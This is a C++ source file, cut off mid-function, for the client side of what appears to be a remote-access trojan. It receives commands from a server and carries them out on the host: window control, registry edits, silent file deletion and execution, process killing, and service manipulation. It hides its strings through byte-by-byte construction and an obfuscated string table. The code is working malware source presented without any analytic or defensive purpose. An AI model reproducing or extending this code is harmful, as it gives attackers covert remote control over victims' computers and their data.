// MyAdminTrans.cpp: implementation of the CMyMainTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyMainTrans.h"
#include "MyDownTrans.h"
#include "MyClientMain.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyMainTrans::CMyMainTrans()
{
	m_Command = 0;	
	m_dTransLen = 0;
	m_TransData = NULL;
	m_gFunc.GetTempPath(250, m_TmpFilePath);

	/*%08x.tmp*/
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = (char) 0x25;m_TmpStr[1] = (char) 0x30;m_TmpStr[2] = (char) 0x38;m_TmpStr[3] = (char) 0x78;m_TmpStr[4] = (char) 0x2e;m_TmpStr[5] = (char) 0x74;m_TmpStr[6] = (char) 0x6d;m_TmpStr[7] = (char) 0x70;m_TmpStr[8] = 0x00;
	m_gFunc.sprintf(m_TmpFilePath + m_gFunc.strlen(m_TmpFilePath), m_TmpStr, m_gFunc.GetCurrentThreadId());
}

CMyMainTrans::~CMyMainTrans()
{
	Close();
	if(m_TransData != NULL)
	{
		delete [] m_TransData;
	}
	m_gFunc.DeleteFile(m_TmpFilePath);
}

BOOL CMyMainTrans::StartWork(HWND hWnd)
{
	//连接到服务器
	if(!Create(WM_CONNECT_FILE, hWnd))
	{
		return FALSE;
	}

	//开始任务
	while(1)
	{
		//接收命令
		if(!ReadBag())
		{
			break;
		}

		//归零命令
		UINT nCmd = m_Command;
		m_Command = 0;

		//命令处理
		switch(nCmd)
		{
			//枚举窗口
			case CLIENT_ENUM_WINDOWS :
				MyEnumWindows();
				break;

			//关闭窗口，最大化窗口，最小化窗口
			case CLIENT_CONTROL_WINDOWS :
				MyContrlWindows();
				break;

			//删除指定键值
			case CLIENT_REG_DELETE_VALUE :
				MyRegDeleteValue();
				break;

			//更改键值
			case CLIENT_REG_UPDATE_VALUE :
				MyRegEditValue();
				break;

			//取注册表子键值
			case CLIENT_REG_QUERY :
				MyRegEnumKey();
				break;

			//删除指定子键
			case CLIENT_REG_DELETE_KEY :
				MyRegDeleteKey();
				break;

			//新建目录
			case CLIENT_CREATE_DIR :	
				CreateDir();
				break;
			
			//显示目录内容
			case CLIENT_DIR_LIST :	
				GetDirList();
				break;

			//取磁盘列表
				case CLIENT_DISK_LIST :	
				GetDiskList();
				break;

			//查找指定文件
			case CLIENT_FIND_FILE :
				GetFindFileList();
				break;

			//目录信息
			case CLIENT_DIR_INFO	:	
				GetDirInfo();
				break;

			//文件信息
			case CLIENT_FILE_INFO	:	
				GetFileInfo();
				break;

			//磁盘信息
			case CLIENT_DISK_INFO	:	
				GetDiskInfo();
				break;

			//更名
			case CLIENT_RENAME		:	
				ReNameFile();
				break;

			//删除文件
			case CLIENT_FILE_DELETE	:	
				DeleteMyFile();
				break;

			//运行文件
			case CLIENT_EXEC_FILE	:	
				ExecFile();
				break;

			//取目录拷贝列表
			case CLIENT_DOWN_FILE_LIST :
				GetDownFileList();
				break;

			//杀进程
			case CLIENT_PROCESS_KILL:	
				KillOneProcess();
				break;
			
			//列举进程
			case CLIENT_PROCESS_LIST :
				GetProcessList();
				break;

			//列举服务
			case CLIENT_ENUM_SERVICES :
				EnumMyServices();
				break;

			//更新服务
			case CLIENT_CONFIG_SERVICES :
				ConfigMyServices();
				break;

			//控制服务
			case CLIENT_CONTROL_SERVICES :
				ControlMyServices();
				break;

			//删除服务 
			case CLIENT_DELETE_SERVICE :
				DeleteMyServices();
				break;

			default	:	
				m_Command = INVALID_COMMAND;
				break;
		}

		//发送数据
		if(!SendBag())
		{
			break;
		}
	}
	return TRUE;
}


void CMyMainTrans::GetDiskList()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	TCHAR m_DiskNameBuf[MAX_PATH] = {0};	
	DWORD nSize = m_gFunc.GetLogicalDriveStrings(512, m_DiskNameBuf);
	for(DWORD i = 0; i < nSize; i += 4)
	{
		m_gFunc.CharLower(&m_DiskNameBuf[i]);
		if(m_DiskNameBuf[i] != 'a' && m_DiskNameBuf[i] != 'b')
		{
			DISKINFO m_DiskInfo = {0};
			FillDiskInfo(&m_DiskNameBuf[i], m_DiskInfo);
			DWORD nWriteLen = 0;
			m_gFunc.WriteFile(hFile, &m_DiskInfo, sizeof(DISKINFO), &nWriteLen, NULL);
		}
	}

	m_gFunc.CloseHandle(hFile);
}

void CMyMainTrans::DeleteMyFile()
{
	LPDIRFILELIST pItemData = (LPDIRFILELIST) m_TransData;
	for(DWORD i = 0; i < (m_dTransLen / sizeof(DIRFILELIST)); i++)
	{
		FileOpertion(pItemData->m_ItemPath, "", FO_DELETE);
		pItemData ++;
	}
}

void CMyMainTrans::CreateDir()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	if(!m_gFunc.CreateDirectory(pItem->m_FileName, NULL))
	{
		m_Command = CREATE_DIR_FAILE;
	}
}

void CMyMainTrans::ReNameFile()
{
	LPRENAMEFILEITEM pItem = (LPRENAMEFILEITEM) m_TransData;
	if(!m_gFunc.MoveFile(pItem->m_OldFileName, pItem->m_NewFileName))
	{
		m_Command = RENAME_FAILE;
	}
}

void CMyMainTrans::GetFindFileList()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	TCHAR m_FileName[MAX_PATH] = {0};
	TCHAR *p = m_gFunc.strrchr(pItem->m_FileName, '\\');
	if(p == NULL)
	{
		m_Command = COMMAND_PARAM_ERR;
		return;
	}
	*p = 0;
	m_gFunc.strcpy(m_FileName, p + 1);

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	if(!FindFile(pItem->m_FileName, m_FileName, hFile))
	{
		m_Command = NOT_FIND_ANY_FILE;
	}
	m_gFunc.CloseHandle(hFile);

}

void CMyMainTrans::FillDiskInfo(LPCTSTR pDiskName, DISKINFO& m_DiskInfo)
{
	m_gFunc.strcpy(m_DiskInfo.m_Name, pDiskName);
	if(!m_gFunc.GetDiskFreeSpaceEx(m_DiskInfo.m_Name, 
		(ULARGE_INTEGER*) &(m_DiskInfo.FreeBytesAvailable),
		(ULARGE_INTEGER*) &(m_DiskInfo.TotalNumberOfBytes),
		(ULARGE_INTEGER*) &(m_DiskInfo.TotalNumberOfFreeBytes)))
	{
		m_DiskInfo.TotalNumberOfBytes = 0;
		m_DiskInfo.FreeBytesAvailable = 0;
		m_DiskInfo.TotalNumberOfFreeBytes = 0;
	}

	//%s后面加了斜杠
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10286, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	DWORD MaximumComponentLength = 0;
	DWORD FileSystemFlags = 0;
	TCHAR m_DiskName[24] = {0};
	m_gFunc.sprintf(m_DiskName, m_TmpStr, pDiskName);
	m_gFunc.GetVolumeInformation(m_DiskName, m_DiskInfo.m_Volume, 128, NULL,&MaximumComponentLength, &FileSystemFlags, m_DiskInfo.m_FileSys, 128);
	m_DiskInfo.m_DeviceType = m_gFunc.GetDriveType(m_DiskName);
}

void CMyMainTrans::GetDiskInfo()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	DISKINFO m_DiskInfo = {0};
	
	FillDiskInfo(pItem->m_FileName, m_DiskInfo);

	m_dTransLen = sizeof(DISKINFO);
	m_gFunc.memcpy(m_TransData, &m_DiskInfo, m_dTransLen);
	SaveDataToTmpFile();
}

HANDLE CMyMainTrans::OpenMyTmpFile()
{
	m_gFunc.DeleteFile(m_TmpFilePath);
	HANDLE hFile = m_gFunc.CreateFile(m_TmpFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	return hFile;
}

void CMyMainTrans::SaveDirListInfo(HANDLE hFile, LPCTSTR pFilePath)
{
	DIRFILELIST m_Info = {0};
	m_gFunc.strcpy(m_Info.m_ItemPath, pFilePath);

	if(!m_gFunc.GetFileAttributesEx(pFilePath, GetFileExInfoStandard, &m_Info.m_FileData))
	{
		return;
	}

	DWORD nWriteLen = 0;
	m_gFunc.WriteFile(hFile, &m_Info, sizeof(DIRFILELIST), &nWriteLen, NULL);
}

void CMyMainTrans::GetDirList()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;

	//%s\\*.*
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10287, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	m_gFunc.strcpy(m_FindPath, pItem->m_FileName);
	m_gFunc.sprintf(m_DirFindName, m_TmpStr, m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = m_gFunc.FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		m_Command = NOT_FIND_ANY_FILE;
		return;
	}

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_gFunc.CloseHandle(hFind);
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	//%s\\%s
	char m_TmpStrReturn[256] = {0};
	m_gFunc.GetMyString(10288, m_TmpStrReturn, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	char m_Str1[20] = {0};
	m_Str1[0] = '.';

	char m_Str2[20] = {0};
	m_Str2[0] = '.';
	m_Str2[1] = '.';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(m_gFunc.strcmp(m_FindData.cFileName, m_Str1) != 0 && m_gFunc.strcmp(m_FindData.cFileName, m_Str2) != 0)
		{
			m_gFunc.sprintf(m_FilePath, m_TmpStrReturn, m_FindPath, m_FindData.cFileName);
			SaveDirListInfo(hFile, m_FilePath);
		}

		if(!m_gFunc.FindNextFile(hFind, &m_FindData)) 
		{
			if(m_gFunc.GetLastError() != ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			} 
			else 
			{ 
				//异常错误
				break; 
			} 
		}

	}
	m_gFunc.FindClose(hFind);
	m_gFunc.CloseHandle(hFile);

}

BOOL CMyMainTrans::FindFile(LPCTSTR m_ParentPath, LPCTSTR FileName, HANDLE hFile)
{
	TCHAR m_FindName[MAX_PATH] = {0};
	m_gFunc.strcpy(m_FindName, FileName);

	//%s\\%s
	char m_TmpStrReturn[256] = {0};
	m_gFunc.GetMyString(10288, m_TmpStrReturn, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//%s\\*.*
	char m_TmpStrDub[256] = {0};
	m_gFunc.GetMyString(10287, m_TmpStrDub, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	m_gFunc.strcpy(m_FindPath, m_ParentPath);
	m_gFunc.sprintf(m_DirFindName, m_TmpStrDub, m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = m_gFunc.FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char m_Str1[20] = {0};
	m_Str1[0] = '.';

	char m_Str2[20] = {0};
	m_Str2[0] = '.';
	m_Str2[1] = '.';

	char m_Str3[20] = {0};
	m_Str3[0] = '*';

	char m_Str4[20] = {0};
	m_Str4[0] = '*';
	m_Str4[1] = '.';
	m_Str4[2] = '*';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		char m_DesStr[256] = {0};
		m_gFunc.strcpy(m_DesStr, m_FindData.cFileName);
		m_gFunc.CharLower(m_DesStr);
		m_gFunc.CharLower(m_FindName);
		size_t len = m_gFunc.strlen(m_FindName);

		if(m_gFunc.strcmp(m_DesStr, m_Str1) != 0 && m_gFunc.strcmp(m_DesStr, m_Str2) != 0)
		{
			m_gFunc.sprintf(m_FilePath, m_TmpStrReturn, m_FindPath, m_DesStr);
			if(m_FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				//目录
				if(!FindFile(m_FilePath, FileName, hFile))
				{
					return FALSE;
				}
			}
			else
			{
				//* || *.*
				if(m_gFunc.strcmp(m_FindName, m_Str3) == 0 || m_gFunc.strcmp(m_FindName, m_Str4) == 0)
				{
					SaveDirListInfo(hFile, m_FilePath);
				}
				//*.查找
				else if(m_FindName[0] == m_Str3[0] && m_FindName[1] == m_Str1[0])
				{
					if(m_gFunc.strcmp(m_FindName + 1, m_DesStr + m_gFunc.strlen(m_DesStr) - m_gFunc.strlen(m_FindName + 1)) == 0)
					{
						SaveDirListInfo(hFile, m_FilePath);
					}
				}
				//.*查找
				else if(m_FindName[len - 2] == m_Str1[0] && m_FindName[len - 1] == m_Str3[0])
				{
					//扩展名查找
					if((m_gFunc.memcmp(m_FindName, m_DesStr, len - 2) == 0) && (len + 2 == m_gFunc.strlen(m_DesStr)))
					{
						SaveDirListInfo(hFile, m_FilePath);
					}
				}
				else if(m_gFunc.strcmp(m_FindName, m_DesStr) == 0)
				{
					SaveDirListInfo(hFile, m_FilePath);
				}
			}
		}

		if(!m_gFunc.FindNextFile(hFind, &m_FindData)) 
		{
			if(m_gFunc.GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			} 
			else 
			{ 
				//异常错误
				m_gFunc.FindClose(hFind);
				return FALSE; 
			} 
		}
	}
	m_gFunc.FindClose(hFind);
	return TRUE;
}

void CMyMainTrans::GetFileInfo()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	FILEINFO m_FileInfo = {0};
	m_gFunc.strcpy(m_FileInfo.m_szFullName, pItem->m_FileName);
	if(!m_gFunc.GetFileAttributesEx(pItem->m_FileName, GetFileExInfoStandard, &m_FileInfo.m_FileData))
	{
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	m_gFunc.memcpy(m_TransData, &m_FileInfo, sizeof(FILEINFO));
	m_dTransLen = sizeof(FILEINFO);
	SaveDataToTmpFile();
}

void CMyMainTrans::GetDirInfo()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	DIRINFO m_DirInfo;
	m_DirInfo.m_AllFileSize = 0;
	m_DirInfo.m_DirCount = 0;
	m_DirInfo.m_FileCount = 0;
	m_gFunc.strcpy(m_DirInfo.m_szFullName, pItem->m_FileName);
	if(!m_gFunc.GetFileAttributesEx(pItem->m_FileName, GetFileExInfoStandard, &m_DirInfo.m_FileData))
	{
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	if(!FindDir(pItem->m_FileName, m_DirInfo.m_DirCount, m_DirInfo.m_FileCount, m_DirInfo.m_AllFileSize))
	{
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	m_dTransLen = sizeof(DIRINFO);
	m_gFunc.memcpy(m_TransData, &m_DirInfo, m_dTransLen);
	SaveDataToTmpFile();
}

BOOL CMyMainTrans::FindDir(LPCTSTR m_ParentPath, int & DirCount,int & FileCount, ULONGLONG & AllFileSize)
{
	//%s\\*.*
	char m_TmpStrDub[256] = {0};
	m_gFunc.GetMyString(10287, m_TmpStrDub, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	m_gFunc.strcpy(m_FindPath, m_ParentPath);
	m_gFunc.sprintf(m_DirFindName, m_TmpStrDub, m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = m_gFunc.FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	//%s\\%s
	char m_TmpStrReturn[256] = {0};
	m_gFunc.GetMyString(10288, m_TmpStrReturn, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	char m_Str1[20] = {0};
	m_Str1[0] = '.';

	char m_Str2[20] = {0};
	m_Str2[0] = '.';
	m_Str2[1] = '.';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(m_gFunc.strcmp(m_FindData.cFileName, m_Str1) != 0 && m_gFunc.strcmp(m_FindData.cFileName, m_Str2))
		{
			m_gFunc.sprintf(m_FilePath, m_TmpStrReturn, m_FindPath, m_FindData.cFileName);
			if(m_FindData.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				//目录
				DirCount++;
				if(!FindDir(m_FilePath, DirCount, FileCount, AllFileSize))
				{
					return FALSE;
				}
			}
			else
			{
				//文件
				FileCount++;
				LARGE_INTEGER nFileSize;
				nFileSize.LowPart = m_FindData.nFileSizeLow;
				nFileSize.HighPart = m_FindData.nFileSizeHigh;
				AllFileSize += nFileSize.QuadPart;
			}
		}
		if(!m_gFunc.FindNextFile(hFind, &m_FindData)) 
		{
			if(m_gFunc.GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			}
			else 
			{ 
				//异常错误
				m_gFunc.FindClose(hFind);
				return FALSE; 
			} 
		}
	}
	m_gFunc.FindClose(hFind);
	return TRUE;
}



void CMyMainTrans::ExecFile()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	m_gFunc.ShellExecute(NULL, NULL, pItem->m_FileName, NULL, NULL, SW_SHOW);
}

void CMyMainTrans::SaveCopyListInfo(HANDLE hFile, LPCTSTR pFilePath)
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData = {0};
	if(!m_gFunc.GetFileAttributesEx(pFilePath, GetFileExInfoStandard, &m_FileData))
	{
		return;
	}
	CPFILEINFO m_Info = {0};
	m_Info.m_FileLen.HighPart = m_FileData.nFileSizeHigh;
	m_Info.m_FileLen.LowPart = m_FileData.nFileSizeLow;
	m_gFunc.strcpy(m_Info.m_FileName, pFilePath);
	DWORD nWriteLen = 0;
	m_gFunc.WriteFile(hFile, &m_Info, sizeof(CPFILEINFO), &nWriteLen, NULL);
}

void CMyMainTrans::GetDownFileList()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	LPDIRFILELIST pData = (LPDIRFILELIST) m_TransData;
	for(DWORD i = 0; i < m_dTransLen / sizeof(DIRFILELIST); i++)
	{
		if(pData->m_FileData.dwFileAttributes)
		{
			FindCopyFile(pData->m_ItemPath, hFile);
		}
		else
		{
			SaveCopyListInfo(hFile, pData->m_ItemPath);
		}	
		pData++;
	}
	m_gFunc.CloseHandle(hFile);
}

BOOL CMyMainTrans::FindCopyFile(LPCTSTR m_ParentPath, HANDLE hFile)
{
	//%s\\*.*
	char m_TmpStrDub[256] = {0};
	m_gFunc.GetMyString(10287, m_TmpStrDub, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	m_gFunc.strcpy(m_FindPath, m_ParentPath);
	m_gFunc.sprintf(m_DirFindName, m_TmpStrDub, m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = m_gFunc.FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	//%s\\%s
	char m_TmpStrReturn[256] = {0};
	m_gFunc.GetMyString(10288, m_TmpStrReturn, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	char m_Str1[20] = {0};
	m_Str1[0] = '.';

	char m_Str2[20] = {0};
	m_Str2[0] = '.';
	m_Str2[1] = '.';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(m_gFunc.strcmp(m_FindData.cFileName, m_Str1) != 0 && m_gFunc.strcmp(m_FindData.cFileName, m_Str2))
		{
			m_gFunc.sprintf(m_FilePath, m_TmpStrReturn, m_FindPath, m_FindData.cFileName);
			if(m_FindData.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				//目录
				if(!FindCopyFile(m_FilePath, hFile))
				{
					return FALSE;
				}
			}
			else
			{
				//文件
				SaveCopyListInfo(hFile, m_FilePath);
			}
		
		}
		if(!m_gFunc.FindNextFile(hFind, &m_FindData)) 
		{
			if(m_gFunc.GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			} 
			else 
			{ 
				//异常错误
				m_gFunc.FindClose(hFind);
				return FALSE; 
			} 
		}
	}
	m_gFunc.FindClose(hFind);
	return TRUE;
}

BOOL WINAPI CMyMainTrans::FileOpertion(LPCTSTR szFileName1,LPCTSTR szFileName2,DWORD opt)
{ 
	SHFILEOPSTRUCT shf = {0}; 
	TCHAR sr[MAX_PATH] = {0}; 
	TCHAR de[MAX_PATH] = {0};
	m_gFunc.strcpy(sr, szFileName1); 
	m_gFunc.strcpy(de, szFileName2); 
	m_gFunc.memset(&shf, 0, sizeof(shf)); 
	shf.hwnd = NULL;
	shf.wFunc = opt; 
	shf.pFrom = sr; 
	shf.pTo = de; 
	shf.fFlags = FOF_SILENT|FOF_FILESONLY|FOF_MULTIDESTFILES|FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR; 
	return (!(m_gFunc.SHFileOperation(&shf)));
} 

BOOL CALLBACK CMyMainTrans::EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	DWORD nPid = 0;
	m_gFunc.GetWindowThreadProcessId(hWnd, &nPid);
	if(nPid == m_gFunc.GetCurrentProcessId())
	{
		return TRUE;
	}

	char m_MStr[10] = {0};
	m_MStr[0] = 'M';

	//Default IME
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10268, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TCHAR m_Title[MAX_PATH] = {0};
	m_gFunc.GetWindowText(hWnd, m_Title, 512);
	if(m_gFunc.strlen(m_Title) > 0 && (m_gFunc.strcmp(m_Title, m_MStr) != 0) && (m_gFunc.strcmp(m_Title, m_TmpStr) != 0))
	{
		WINDOWITEM m_Item = {0};
		m_Item.m_hWnd = hWnd;
		m_gFunc.strcpy(m_Item.m_WndName, m_Title);
		MyMainFunc::GetMoudleMame(nPid, m_Item.m_ProcName);
		DWORD nWriteLen = 0;
		m_gFunc.WriteFile((HANDLE) lParam, &m_Item, sizeof(WINDOWITEM), &nWriteLen, NULL);
	}
	return TRUE;
}

void CMyMainTrans::MyEnumWindows()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}
	
	HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());
	HDESK hNewDesktop = m_gFunc.OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		m_gFunc.SetThreadDesktop(hNewDesktop);
	}
	m_gFunc.EnumWindows(EnumWindowsProc, (LPARAM) hFile);
	m_gFunc.SetThreadDesktop(hOldDesktop);
	m_gFunc.CloseHandle(hFile);
}

void CMyMainTrans::MyContrlWindows()
{
	LPWINDOWITEM pItem = (LPWINDOWITEM) m_TransData;

	HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());
	HDESK hNewDesktop = m_gFunc.OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		m_gFunc.SetThreadDesktop(hNewDesktop);
	}
	switch(pItem->m_CtrlType)
	{
		case WM_CLOSE	: m_gFunc.PostMessage(pItem->m_hWnd, WM_CLOSE, 0, 0); break;
		default		: m_gFunc.ShowWindow(pItem->m_hWnd, pItem->m_CtrlType); break;
	}
	if(pItem->m_CtrlType == SW_SHOWMAXIMIZED || pItem->m_CtrlType == SW_SHOW)
	{
		m_gFunc.BringWindowToTop(pItem->m_hWnd);
		m_gFunc.UpdateWindow(pItem->m_hWnd);
	}
	m_gFunc.SetThreadDesktop(hOldDesktop);
}

void CMyMainTrans::GetProcessList()
{
	HANDLE m_Sys = m_gFunc.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(m_Sys == NULL)
	{
		m_Command = GET_PROCESS_LIST_ERR;
		return;
	}

	PROCESSENTRY32 m_Lppe = {0};
	m_Lppe.dwSize = sizeof(PROCESSENTRY32);
	if(!m_gFunc.Process32First(m_Sys, &m_Lppe))
	{
		m_Command = GET_PROCESS_LIST_ERR;
		m_gFunc.CloseHandle(m_Sys);
		return;
	}
	
	MyMainFunc::GetMyToken();

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	PROCESSLIST m_ProcessList = {0};
	m_ProcessList.cntThreads = m_Lppe.cntThreads;
	m_ProcessList.pcPriClassBase = m_Lppe.pcPriClassBase;
	m_ProcessList.th32ProcessID = m_Lppe.th32ProcessID;
	m_gFunc.strcpy(m_ProcessList.szExeFile,m_Lppe.szExeFile);
	if(m_gFunc.strrchr(m_ProcessList.szExeFile, '\\') == NULL)
	{
		MyMainFunc::GetMoudleMame(m_ProcessList.th32ProcessID, m_ProcessList.szExeFile);
	}

	DWORD nWriteLen = 0;
	m_gFunc.WriteFile(hFile, &m_ProcessList, sizeof(PROCESSLIST), &nWriteLen, NULL);
	while(m_gFunc.Process32Next(m_Sys,&m_Lppe))
	{
		m_gFunc.memset(&m_ProcessList, 0, sizeof(PROCESSLIST));
		m_ProcessList.cntThreads = m_Lppe.cntThreads;
		m_ProcessList.pcPriClassBase = m_Lppe.pcPriClassBase;
		m_ProcessList.th32ProcessID = m_Lppe.th32ProcessID;
		m_gFunc.strcpy(m_ProcessList.szExeFile,m_Lppe.szExeFile);
		if(m_gFunc.strrchr(m_ProcessList.szExeFile, '\\') == NULL)
		{
			MyMainFunc::GetMoudleMame(m_ProcessList.th32ProcessID, m_ProcessList.szExeFile);
		}
		m_gFunc.WriteFile(hFile, &m_ProcessList, sizeof(PROCESSLIST), &nWriteLen, NULL);
	}
	m_gFunc.CloseHandle(hFile);
	m_gFunc.CloseHandle(m_Sys);
}

void CMyMainTrans::KillOneProcess()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	DWORD m_ProcessId = m_gFunc.atoi(pItem->m_FileName);

	MyMainFunc::GetMyToken();
	HANDLE m_Kill = m_gFunc.OpenProcess(PROCESS_TERMINATE, FALSE, m_ProcessId);
	if(m_Kill == NULL)
	{
		//终止进程失败
		m_Command = KILL_PROCESS_ERR;
		return;
	}
	if(!m_gFunc.TerminateProcess(m_Kill,0))
	{
		//终止进程失败
		m_Command = KILL_PROCESS_ERR;
		m_gFunc.CloseHandle(m_Kill);
		return;
	}
	m_gFunc.CloseHandle(m_Kill);
}

void CMyMainTrans::ConfigMyServices()
{
	MyMainFunc::GetMyToken();

	SC_HANDLE hMana = m_gFunc.OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		m_Command = CONFIG_SERVICES_FAIL;
		return;
	}
	LPMYSERVICES pServices = (LPMYSERVICES) m_TransData;
	SC_HANDLE hServices = m_gFunc.OpenService(hMana, pServices->m_Name,SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		m_gFunc.CloseServiceHandle(hMana);
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}
	if(!m_gFunc.ChangeServiceConfig(hServices, SERVICE_NO_CHANGE,pServices->dwStartType, SERVICE_NO_CHANGE ,NULL, NULL, NULL, NULL, NULL, NULL, pServices->m_Disp))
	{
		m_gFunc.CloseServiceHandle(hServices);
		m_gFunc.CloseServiceHandle(hMana);
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}
	m_gFunc.CloseServiceHandle(hServices);
	m_gFunc.CloseServiceHandle(hMana);
	m_Command = 0;
}

void CMyMainTrans::ControlMyServices()
{
	LPCONTROLSERVICES pItem = (LPCONTROLSERVICES) m_TransData;

	MyMainFunc::GetMyToken();

	SC_HANDLE hMana = m_gFunc.OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}

	SC_HANDLE hServices = m_gFunc.OpenService(hMana, pItem->m_Name, SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		m_gFunc.CloseServiceHandle(hMana);
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}

	BOOL ret = FALSE;
	SERVICE_STATUS m_Status = {0};
	switch(pItem->m_Flag)
	{
		case 0	: ret = m_gFunc.StartService(hServices, NULL, 0); break;
		case 1	: ret = m_gFunc.ControlService(hServices, SERVICE_CONTROL_STOP, &m_Status); break;
		default	: break;
	}
	if(ret)
	{
		m_Command = 0;
	}
	else
	{
		m_Command = CONTROL_SERVICES_FAIL;
	}
	m_gFunc.CloseServiceHandle(hServices);
	m_gFunc.CloseServiceHandle(hMana);
}

void CMyMainTrans::DeleteMyServices()
{
	LPCONTROLSERVICES pItem = (LPCONTROLSERVICES) m_TransData;
	if(!MyMainFunc::DeleteMyService(pItem->m_Name))
	{
		m_Command = SERVICE_DELETE_ERR;
	}
}

void CMyMainTrans::EnumMyServices()
{
	MyMainFunc::GetMyToken();

